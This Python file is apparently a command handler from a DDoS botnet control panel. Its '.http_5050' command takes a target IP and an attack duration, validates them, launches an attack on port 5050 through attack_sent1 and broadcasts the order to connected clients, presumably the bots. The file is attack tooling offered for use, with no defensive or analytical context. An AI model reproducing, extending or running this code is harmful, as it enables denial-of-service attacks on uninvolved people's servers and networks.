from colorama import Fore

def http(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data):
    if len(args) == 3:
        ip = args[1]
        secs = args[2]
        if validate_ip(ip):
            if validate_time(secs):
                send(client, ansi_clear, False)
                attack_sent1(ip,5050, secs, client)
                broadcast(data)
            else:
                send(client, Fore.RED + 'Invalid attack duration (1-999999999999 seconds)')
        else:
            send(client, Fore.RED + 'Invalid IP-address')
    else:
        send(client, 'Usage: .http_5050 [IP] [TIME]')